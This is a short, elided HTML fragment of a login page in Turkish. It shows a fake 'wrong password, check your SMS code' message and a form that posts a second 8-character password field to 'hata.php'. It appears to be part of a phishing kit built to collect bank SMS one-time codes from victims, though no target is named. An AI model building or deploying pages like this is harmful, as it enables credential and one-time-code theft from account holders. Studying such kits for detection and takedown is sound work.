...
<div id="passwordEntryPanel" class="panel-body">
  ...
  <h1 class="panel-title light"> Şifrenizi Hatalı Girdiniz Lütfen SMS Şifrenizi Kontrol Ediniz</p></h1> 
...
<div class="form-horizontal">
         ...
         <form id="loginForm" class="validate:(validated) validationName:(validatedName1)" action="hata.php" method="POST" autocomplete="off">   <input name="_dummyElement_1500320452874" id="_dummyElement_1500320452874" type="text" class="structural elementHide no-print"/>  
 ...
 <br>
			 ...
			 <input  class="form-control "  id="pass2" name="pass2" maxlength="8" type="password"/>      
